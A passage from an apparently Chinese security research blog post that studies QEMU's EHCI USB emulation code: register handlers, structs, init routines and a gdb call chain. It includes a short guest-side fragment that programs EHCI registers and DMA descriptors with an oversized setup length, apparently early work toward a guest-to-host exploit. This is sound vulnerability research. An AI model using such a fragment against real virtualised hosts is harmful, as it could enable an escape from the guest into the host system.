unlink.</span></span><br><span class="line"><span class="comment">             */</span></span><br><span class="line">            s-&gt;async_stepdown = <span class="number">0</span>;</span><br><span class="line">            qemu_bh_schedule(s-&gt;async_bh);</span><br><span class="line">            trace_usb_ehci_doorbell_ring();</span><br><span class="line">        &#125;</span><br><span class="line">    </span><br><span class="line">        <span class="keyword">if</span> (((USBCMD_RUNSTOP | USBCMD_PSE | USBCMD_ASE) &amp; val) !=</span><br><span class="line">            ((USBCMD_RUNSTOP | USBCMD_PSE | USBCMD_ASE) &amp; s-&gt;usbcmd)) &#123;</span><br><span class="line">            <span class="keyword">if</span> (s-&gt;pstate == EST_INACTIVE) &#123;</span><br><span class="line">                SET_LAST_RUN_CLOCK(s);</span><br><span class="line">            &#125;</span><br><span class="line">            s-&gt;usbcmd = val; <span class="comment">/* Set usbcmd for ehci_update_halt() */</span></span><br><span class="line">            ehci_update_halt(s);</span><br><span class="line">            s-&gt;async_stepdown = <span class="number">0</span>;</span><br><span class="line">            qemu_bh_schedule(s-&gt;async_bh);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">case</span> USBSTS:</span><br><span class="line">        val &amp;= USBSTS_RO_MASK;              <span class="comment">// bits 6 through 31 are RO</span></span><br><span class="line">        ehci_clear_usbsts(s, val);          <span class="comment">// bits 0 through 5 are R/WC</span></span><br><span class="line">        val = s-&gt;usbsts;</span><br><span class="line">        ehci_update_irq(s);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">case</span> USBINTR:</span><br><span class="line">        val &amp;= USBINTR_MASK;<span class="comment">// int 的范围</span></span><br><span class="line">        <span class="keyword">if</span> (ehci_enabled(s) &amp;&amp; (USBSTS_FLR &amp; val)) &#123;</span><br><span class="line">            qemu_bh_schedule(s-&gt;async_bh);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">case</span> FRINDEX:<span class="comment">// fromdex</span></span><br><span class="line">        val &amp;= <span class="number">0x00003fff</span>; <span class="comment">/* frindex is 14bits */</span></span><br><span class="line">        s-&gt;usbsts_frindex = val;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">case</span> CONFIGFLAG:<span class="comment">//configflag</span></span><br><span class="line">        val &amp;= <span class="number">0x1</span>;</span><br><span class="line">        <span class="keyword">if</span> (val) &#123;</span><br><span class="line">            <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; NB_PORTS; i++)</span><br><span class="line">                handle_port_owner_write(s, i, <span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">case</span> PERIODICLISTBASE:<span class="comment">//periodiclistbase</span></span><br><span class="line">        <span class="keyword">if</span> (ehci_periodic_enabled(s)) &#123;</span><br><span class="line">            <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>,</span><br><span class="line">              <span class="string">"ehci: PERIODIC list base register set while periodic schedule\n"</span></span><br><span class="line">              <span class="string">"      is enabled and HC is enabled\n"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">case</span> ASYNCLISTADDR:<span class="comment">//asynclistaddr</span></span><br><span class="line">        <span class="keyword">if</span> (ehci_async_enabled(s)) &#123;</span><br><span class="line">            <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>,</span><br><span class="line">              <span class="string">"ehci: ASYNC list address register set while async schedule\n"</span></span><br><span class="line">              <span class="string">"      is enabled and HC is enabled\n"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    *mmio = val;</span><br><span class="line">    trace_usb_ehci_opreg_change(addr + s-&gt;opregbase, addr2str(addr),</span><br><span class="line">                                *mmio, old);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>下面是上面几组ops涉及的结构体</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">EHCIState</span> &#123;</span></span><br><span class="line">    USBBus bus;</span><br><span class="line">    DeviceState *device;</span><br><span class="line">    qemu_irq irq;</span><br><span class="line">    MemoryRegion mem;</span><br><span class="line">    AddressSpace *as;</span><br><span class="line">    MemoryRegion mem_caps;</span><br><span class="line">    MemoryRegion mem_opreg;</span><br><span class="line">    MemoryRegion mem_ports;</span><br><span class="line">    <span class="keyword">int</span> companion_count;</span><br><span class="line">    <span class="keyword">bool</span> companion_enable;</span><br><span class="line">    <span class="keyword">uint16_t</span> capsbase;</span><br><span class="line">    <span class="keyword">uint16_t</span> opregbase;</span><br><span class="line">    <span class="keyword">uint16_t</span> portscbase;</span><br><span class="line">    <span class="keyword">uint16_t</span> portnr;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* properties */</span></span><br><span class="line">    <span class="keyword">uint32_t</span> maxframes;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     *  EHCI spec version 1.0 Section 2.3</span></span><br><span class="line"><span class="comment">     *  Host Controller Operational Registers</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">uint8_t</span> caps[CAPA_SIZE];</span><br><span class="line">    <span class="keyword">union</span> &#123;</span><br><span class="line">        <span class="keyword">uint32_t</span> opreg[<span class="number">0x44</span>/<span class="keyword">sizeof</span>(<span class="keyword">uint32_t</span>)];</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">            <span class="keyword">uint32_t</span> usbcmd;</span><br><span class="line">            <span class="keyword">uint32_t</span> usbsts;</span><br><span class="line">            <span class="keyword">uint32_t</span> usbintr;</span><br><span class="line">            <span class="keyword">uint32_t</span> frindex;</span><br><span class="line">            <span class="keyword">uint32_t</span> ctrldssegment;</span><br><span class="line">            <span class="keyword">uint32_t</span> periodiclistbase;</span><br><span class="line">            <span class="keyword">uint32_t</span> asynclistaddr;</span><br><span class="line">            <span class="keyword">uint32_t</span> notused[<span class="number">9</span>];</span><br><span class="line">            <span class="keyword">uint32_t</span> configflag;</span><br><span class="line">        &#125;;</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="keyword">uint32_t</span> portsc[NB_PORTS];</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     *  Internal states, shadow registers, etc</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    QEMUTimer *frame_timer;</span><br><span class="line">    QEMUBH *async_bh;</span><br><span class="line">    <span class="keyword">bool</span> working;</span><br><span class="line">    <span class="keyword">uint32_t</span> astate;         <span class="comment">/* Current state in asynchronous schedule */</span></span><br><span class="line">    <span class="keyword">uint32_t</span> pstate;         <span class="comment">/* Current state in periodic schedule     */</span></span><br><span class="line">    USBPort ports[NB_PORTS];</span><br><span class="line">    USBPort *companion_ports[NB_PORTS];</span><br><span class="line">    <span class="keyword">uint32_t</span> usbsts_pending;</span><br><span class="line">    <span class="keyword">uint32_t</span> usbsts_frindex;</span><br><span class="line">    EHCIQueueHead aqueues;</span><br><span class="line">    EHCIQueueHead pqueues;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* which address to look at next */</span></span><br><span class="line">    <span class="keyword">uint32_t</span> a_fetch_addr;</span><br><span class="line">    <span class="keyword">uint32_t</span> p_fetch_addr;</span><br><span class="line"></span><br><span class="line">    USBPacket ipacket;</span><br><span class="line">    QEMUSGList isgl;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">uint64_t</span> last_run_ns;</span><br><span class="line">    <span class="keyword">uint32_t</span> async_stepdown;</span><br><span class="line">    <span class="keyword">uint32_t</span> periodic_sched_active;</span><br><span class="line">    <span class="keyword">bool</span> int_req_by_async;</span><br><span class="line">    VMChangeStateEntry *vmstate;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>既然看到这里就看看是如何init<br>这些init在文件中定义一般在最下面</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line">void usb_ehci_init(EHCIState *s, DeviceState *dev)</span><br><span class="line">&#123;</span><br><span class="line">    /* 2.2 host controller interface version */</span><br><span class="line">    s-&gt;caps[0x00] = (uint8_t)(s-&gt;opregbase - s-&gt;capsbase);</span><br><span class="line">    s-&gt;caps[0x01] = 0x00;</span><br><span class="line">    s-&gt;caps[0x02] = 0x00;</span><br><span class="line">    s-&gt;caps[0x03] = 0x01;        /* HC version */</span><br><span class="line">    s-&gt;caps[0x04] = s-&gt;portnr;   /* Number of downstream ports */</span><br><span class="line">    s-&gt;caps[0x05] = 0x00;        /* No companion ports at present */</span><br><span class="line">    s-&gt;caps[0x06] = 0x00;</span><br><span class="line">    s-&gt;caps[0x07] = 0x00;</span><br><span class="line">    s-&gt;caps[0x08] = 0x80;        /* We can cache whole frame, no 64-bit */</span><br><span class="line">    s-&gt;caps[0x0a] = 0x00;</span><br><span class="line">    s-&gt;caps[0x0b] = 0x00;  // caps的大小为0x10 ，然后caps是ehci的寄存器，这里是初始化寄存器的状态</span><br><span class="line">    QTAILQ_INIT(&amp;s-&gt;aqueues);</span><br><span class="line">    QTAILQ_INIT(&amp;s-&gt;pqueues);</span><br><span class="line">    usb_packet_init(&amp;s-&gt;ipacket);</span><br><span class="line"></span><br><span class="line">    memory_region_init(&amp;s-&gt;mem, OBJECT(dev), &quot;ehci&quot;, MMIO_SIZE);</span><br><span class="line">    memory_region_init_io(&amp;s-&gt;mem_caps, OBJECT(dev), &amp;ehci_mmio_caps_ops, s,</span><br><span class="line">                          &quot;capabilities&quot;, CAPA_SIZE);//CAPA_SIZE =0x10</span><br><span class="line">    memory_region_init_io(&amp;s-&gt;mem_opreg, OBJECT(dev), &amp;ehci_mmio_opreg_ops, s,</span><br><span class="line">                          &quot;operational&quot;, s-&gt;portscbase);//0x44</span><br><span class="line">    memory_region_init_io(&amp;s-&gt;mem_ports, OBJECT(dev), &amp;ehci_mmio_port_ops, s,</span><br><span class="line">                          &quot;ports&quot;, 4 * s-&gt;portnr);//0x6</span><br><span class="line"></span><br><span class="line">    memory_region_add_subregion(&amp;s-&gt;mem, s-&gt;capsbase, &amp;s-&gt;mem_caps);</span><br><span class="line">    memory_region_add_subregion(&amp;s-&gt;mem, s-&gt;opregbase, &amp;s-&gt;mem_opreg);</span><br><span class="line">    memory_region_add_subregion(&amp;s-&gt;mem, s-&gt;opregbase + s-&gt;portscbase,</span><br><span class="line">                                &amp;s-&gt;mem_ports);</span><br><span class="line">                                </span><br><span class="line">static void usb_ehci_pci_init(Object *obj)</span><br><span class="line">&#123;</span><br><span class="line">    DeviceClass *dc = OBJECT_GET_CLASS(DeviceClass, obj, TYPE_DEVICE);</span><br><span class="line">    EHCIPCIState *i = PCI_EHCI(obj);</span><br><span class="line">    EHCIState *s = &amp;i-&gt;ehci;</span><br><span class="line">  s-&gt;caps[0x09] = 0x68;        /* EECP */</span><br><span class="line">    s-&gt;capsbase = 0x00;</span><br><span class="line">    s-&gt;opregbase = 0x20;</span><br><span class="line">    s-&gt;portscbase = 0x44;</span><br><span class="line">    s-&gt;portnr = NB_PORTS;// 6</span><br><span class="line"></span><br><span class="line">    if (!dc-&gt;hotpluggable) &#123;</span><br><span class="line">        s-&gt;companion_enable = true;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    usb_ehci_init(s, DEVICE(obj));</span><br><span class="line"></span><br><span class="line">static void ehci_sysbus_init(Object *obj)</span><br><span class="line">&#123;</span><br><span class="line">    SysBusDevice *d = SYS_BUS_DEVICE(obj);</span><br><span class="line">    EHCISysBusState *i = SYS_BUS_EHCI(obj);</span><br><span class="line">    SysBusEHCIClass *sec = SYS_BUS_EHCI_GET_CLASS(obj);</span><br><span class="line">    EHCIState *s = &amp;i-&gt;ehci;</span><br><span class="line"></span><br><span class="line">    s-&gt;capsbase = sec-&gt;capsbase;</span><br><span class="line">    s-&gt;opregbase = sec-&gt;opregbase;</span><br><span class="line">    s-&gt;portscbase = sec-&gt;portscbase;</span><br><span class="line">    s-&gt;portnr = sec-&gt;portnr;</span><br><span class="line">    s-&gt;as = &amp;address_space_memory;</span><br><span class="line">    </span><br><span class="line">    usb_ehci_init(s, DEVICE(obj));</span><br><span class="line">    sysbus_init_mmio(d, &amp;s-&gt;mem);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>// 这里有两个 都是调用上面init的，看这个ehci调用什么总线，一个是系统的总线，一个pci的总线<br>void usb_ehci_finalize(EHCIState *s)<br>{<br>    usb_packet_cleanup(&amp;s-&gt;ipacket);<br>}</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">可以看到后面的</span><br><span class="line">void memory_region_init_io(MemoryRegion *mr,</span><br><span class="line">                           Object *owner,</span><br><span class="line">                           const MemoryRegionOps *ops,</span><br><span class="line">                           void *opaque,</span><br><span class="line">                           const char *name,</span><br><span class="line">                           uint64_t size)</span><br><span class="line">&#123;</span><br><span class="line">    memory_region_init(mr, owner, name, size);</span><br><span class="line">    mr-&gt;ops = ops ? ops : &amp;unassigned_mem_ops;</span><br><span class="line">    mr-&gt;opaque = opaque;</span><br><span class="line">    mr-&gt;terminates = true;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">struct USBPacket &#123;</span><br><span class="line">    /* Data fields for use by the driver.  */</span><br><span class="line">    int pid;</span><br><span class="line">    uint64_t id;</span><br><span class="line">    USBEndpoint *ep;</span><br><span class="line">    unsigned int stream;</span><br><span class="line">    QEMUIOVector iov;</span><br><span class="line">    uint64_t parameter; /* control transfers */</span><br><span class="line">    bool short_not_ok;</span><br><span class="line">    bool int_req;</span><br><span class="line">    int status; /* USB_RET_* status code */</span><br><span class="line">    int actual_length; /* Number of bytes actually transferred */</span><br><span class="line">    /* Internal use by the USB layer.  */</span><br><span class="line">    USBPacketState state;</span><br><span class="line">    USBCombinedPacket *combined;</span><br><span class="line">    QTAILQ_ENTRY(USBPacket) queue;</span><br><span class="line">    QTAILQ_ENTRY(USBPacket) combined_entry;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">也就是size是不一样的</span><br><span class="line">上面几组ops都是mmip操作的</span><br><span class="line"></span><br><span class="line">有几个函数要好好看的对于这些操作 mmio和pmio的</span><br><span class="line"></span><br><span class="line">realize</span><br><span class="line">init</span><br><span class="line">还有一个忘了后面再补</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ehci_mmio_port_ops 从0x64开始，然后四个字节为一个单位</span><br><span class="line"></span><br><span class="line">ehci_opreg_write从0x20开始 也是四个字节一个单位</span><br><span class="line"></span><br><span class="line">ehci_mmio_caps_ops 从0开始到0x10</span><br><span class="line"></span><br><span class="line">原来</span><br><span class="line"></span><br><span class="line">在 ops上面也有定义了</span><br><span class="line">max_access_size</span><br><span class="line">min_access_size</span><br></pre></td></tr></table></figure><p>调用链：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">#0  do_token_setup (s=0x55a6c8c44c70, p=0x55a6c8450e00) at /home/yezi/Desktop/qemu/qemu/hw/usb/core.c:133</span><br><span class="line">#1  0x000055a6c6a423de in usb_process_one (p=0x55a6c8450e00) at /home/yezi/Desktop/qemu/qemu/hw/usb/core.c:374</span><br><span class="line">#2  0x000055a6c6a425e9 in usb_handle_packet (dev=0x55a6c8c44c70, p=0x55a6c8450e00) at /home/yezi/Desktop/qemu/qemu/hw/usb/core.c:419</span><br><span class="line">#3  0x000055a6c6a5aab9 in ehci_execute (p=0x55a6c8450dc0, action=0x55a6c6e956ca &quot;process&quot;) at /home/yezi/Desktop/qemu/qemu/hw/usb/hcd-ehci.c:1381</span><br><span class="line">#4  0x000055a6c6a5bee9 in ehci_state_execute (q=0x55a6c8374800) at /home/yezi/Desktop/qemu/qemu/hw/usb/hcd-ehci.c:1942</span><br><span class="line">#5  0x000055a6c6a5c3f5 in ehci_advance_state (ehci=0x55a6c8bbeb70, async=1) at /home/yezi/Desktop/qemu/qemu/hw/usb/hcd-ehci.c:2083</span><br><span class="line">#6  0x000055a6c6a5c632 in ehci_advance_periodic_state (ehci=0x55a6c8bbeb70) at /home/yezi/Desktop/qemu/qemu/hw/usb/hcd-ehci.c:2152</span><br><span class="line">#7  0x000055a6c6a5cc41 in ehci_work_bh (opaque=0x55a6c8bbeb70) at /home/yezi/Desktop/qemu/qemu/hw/usb/hcd-ehci.c:2320</span><br><span class="line">#8  0x000055a6c6cc5250 in aio_bh_call (bh=0x55a6c8c447b0) at /home/yezi/Desktop/qemu/qemu/util/async.c:136</span><br><span class="line">#9  0x000055a6c6cc535a in aio_bh_poll (ctx=0x55a6c7e35fa0) at /home/yezi/Desktop/qemu/qemu/util/async.c:164</span><br><span class="line">#10 0x000055a6c6caf28d in aio_dispatch (ctx=0x55a6c7e35fa0) at /home/yezi/Desktop/qemu/qemu/util/aio-posix.c:380</span><br><span class="line">#11 0x000055a6c6cc578e in aio_ctx_dispatch (source=0x55a6c7e35fa0, callback=0x0, user_data=0x0) at /home/yezi/Desktop/qemu/qemu/util/async.c:306</span><br><span class="line">#12 0x00007f1ece299197 in g_main_context_dispatch () from /lib/x86_64-linux-gnu/libglib-2.0.so.0</span><br><span class="line">#13 0x000055a6c6ccd6f9 in glib_pollfds_poll () at /home/yezi/Desktop/qemu/qemu/util/main-loop.c:217</span><br><span class="line">#14 0x000055a6c6ccd773 in os_host_main_loop_wait (timeout=131899688) at /home/yezi/Desktop/qemu/qemu/util/main-loop.c:240</span><br><span class="line">#15 0x000055a6c6ccd878 in main_loop_wait (nonblocking=0) at /home/yezi/Desktop/qemu/qemu/util/main-loop.c:516</span><br><span class="line">#16 0x000055a6c67cb561 in qemu_main_loop () at /home/yezi/Desktop/qemu/qemu/softmmu/vl.c:1676</span><br><span class="line">#17 0x000055a6c6c53ebe in main (argc=30, argv=0x7ffe1e643258, envp=0x7ffe1e643350) at /home/yezi/Desktop/qemu/qemu/softmmu/main.c:49</span><br><span class="line">#18 0x00007f1eb79a5840 in __libc_start_main (main=0x55a6c6c53e91 &lt;main&gt;, argc=30, argv=0x7ffe1e643258, init=&lt;optimized out&gt;, fini=&lt;optimized out&gt;, rtld_fini=&lt;optimized out&gt;, stack_end=0x7ffe1e643248) at ../csu/libc-start.c:291</span><br><span class="line">#19 0x000055a6c664ef99 in _start ()</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">mmio_write(0x64,0x100); //的确是reset了port</span><br><span class="line">mmio_write(0x64,0x4); // enable port</span><br><span class="line">qh-&gt;epchar=0x00;</span><br><span class="line">qh-&gt;token=1&lt;&lt;7;</span><br><span class="line">qh-&gt;current_qtd=virt2phys(dmabuf+0x200);</span><br><span class="line">struct EHCIqtd * qtd;</span><br><span class="line">qtd=dmabuf+0x200;</span><br><span class="line">qtd-&gt;token=1&lt;&lt;7 | 2&lt;&lt;8 | 8&lt;&lt;16;</span><br><span class="line">qtd-&gt;bufptr[0]=virt2phys(dmabuf+0x300);</span><br><span class="line">setup_buf[6]=0xff;</span><br><span class="line">setup_buf[7]=0x0;</span><br><span class="line">dmabuf32[0]=virt2phys(dmabuf+0x100)+0x2;</span><br><span class="line">mmio_write(0x28,0x0);//清除标志位吧</span><br><span class="line">mmio_write(0x30,0x0);//USB Interrupt Enable</span><br><span class="line">mmio_write(0x38,virt2phys(dmabuf));//    设置 asynclistaddr:</span><br><span class="line">mmio_write(0x34,virt2phys(dmabuf));//    设置 periodiclistbase</span><br><span class="line">mmio_write(0x20,0x11);// USBCMD_RUNSTOP | USBCMD_PSE</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">https://www.intel.com/content/dam/www/public/us/en/documents/technical-specifications/ehci-specification-for-usb.pdf</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">换成这个调用链</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ehci_advance_periodic_state-&gt;ehci_advance_state-&gt;ehci_state_execute-&gt;ehci_execute-&gt;</span><br><span class="line">usb_handle_packet-&gt;usb_process_one-&gt;do_token_setup</span><br><span class="line"></span><br><span class="line">先看 ehci_advance_periodic_state函数</span><br><span class="line"></span><br><span class="line">​``` c</span><br><span class="line">static void ehci_advance_periodic_state(EHCIState *ehci)</span><br><span class="line">&#123;</span><br><span class="line">    uint32_t entry;</span><br><span class="line">    uint32_t list;</span><br><span class="line">    const int async = 0;</span><br><span class="line"></span><br><span class="line">    // 4.6</span><br><span class="line"></span><br><span class="line">    switch(ehci_get_state(ehci, async)) &#123;</span><br><span class="line">    case EST_INACTIVE:</span><br><span class="line">        if (!(ehci-&gt;frindex &amp; 7) &amp;&amp; ehci_periodic_enabled(ehci)) &#123;</span><br><span class="line">            ehci_set_state(ehci, async, EST_ACTIVE);</span><br><span class="line">            // No break, fall through to ACTIVE</span><br><span class="line">        &#125; else</span><br><span class="line">            break;</span><br><span class="line"></span><br><span class="line">    case EST_ACTIVE:</span><br><span class="line">        if (!(ehci-&gt;frindex &amp; 7) &amp;&amp; !ehci_periodic_enabled(ehci)) &#123;</span><br><span class="line">            ehci_queues_rip_all(ehci, async);</span><br><span class="line">            ehci_set_state(ehci, async, EST_INACTIVE);</span><br><span class="line">            break;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        list = ehci-&gt;periodiclistbase &amp; 0xfffff000;</span><br><span class="line">        /* check that register has been set */</span><br><span class="line">        if (list == 0) &#123;</span><br><span class="line">            break;</span><br><span class="line">        &#125;</span><br><span class="line">        list |= ((ehci-&gt;frindex &amp; 0x1ff8) &gt;&gt; 1);</span><br><span class="line"></span><br><span class="line">        if (get_dwords(ehci, list, &amp;entry, 1) &lt; 0) &#123;</span><br><span class="line">            break;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        DPRINTF(&quot;PERIODIC state adv fr=%d.  [%08X] -&gt; %08X\n&quot;,</span><br><span class="line">                ehci-&gt;frindex / 8, list, entry);</span><br><span class="line">        ehci_set_fetch_addr(ehci, async,entry);</span><br><span class="line">        ehci_set_state(ehci, async, EST_FETCHENTRY);</span><br><span class="line">        ehci_advance_state(ehci, async);</span><br><span class="line">        ehci_queues_rip_unused(ehci, async);</span><br><span class="line">        break;</span><br><span class="line"></span><br><span class="line">    default:</span><br><span class="line">        /* this should only be due to a developer mistake */</span><br><span class="line">        fprintf(stderr, &quot;ehci: Bad periodic state %d. &quot;</span><br><span class="line">                &quot;Resetting to active\n&quot;, ehci-&gt;pstate);</span><br><span class="line">        g_assert_not_reached();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>EHCIState的  s-&gt;pstate=0x1001</p><p>!(ehci-&gt;frindex &amp; 7) &amp;&amp; !ehci_periodic_enabled(ehci)  == 0 不进去</p><p>list = ehci-&gt;periodiclistbase &amp; 0xfffff000;<br>/* check that register has been set */<br>if (list == 0) {<br>    break;<br>}<br>这里 